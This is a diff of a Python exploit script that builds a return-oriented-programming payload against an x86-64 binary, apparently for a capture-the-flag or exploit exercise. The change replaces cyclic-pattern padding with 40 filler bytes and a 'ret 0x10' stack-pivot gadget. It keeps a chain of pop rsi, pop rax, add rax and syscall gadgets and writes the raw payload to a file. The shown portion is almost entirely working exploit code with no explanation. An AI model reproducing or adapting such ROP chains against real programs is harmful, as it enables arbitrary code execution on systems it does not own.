@@ -4,9 +4,9 @@
 from struct import pack
 
 # Padding goes here
-p = (pack('<Q', 0x0000000000400b91) + pack('<Q', 0x0000000000400b92)) * 100 
-p += b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A'
 
+p = b'A' * 40
+p += pack('<Q', 0x0000000000466552) # ret 0x10
 p += pack('<Q', 0x0000000000410123) # pop rsi ; ret
 p += pack('<Q', 0x00000000006b90e0) # @ .data
 p += pack('<Q', 0x00000000004005af) # pop rax ; ret
@@ -84,7 +84,7 @@ p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
 p += pack('<Q', 0x0000000000474920) # add rax, 1 ; ret
 p += pack('<Q', 0x00000000004012bc) # syscall
 
-outputfile = open("paddingbruteforce", "wb")
+outputfile = open("stackpivot.txt", "wb")
 outputfile.write(p)
 outputfile.close()
 
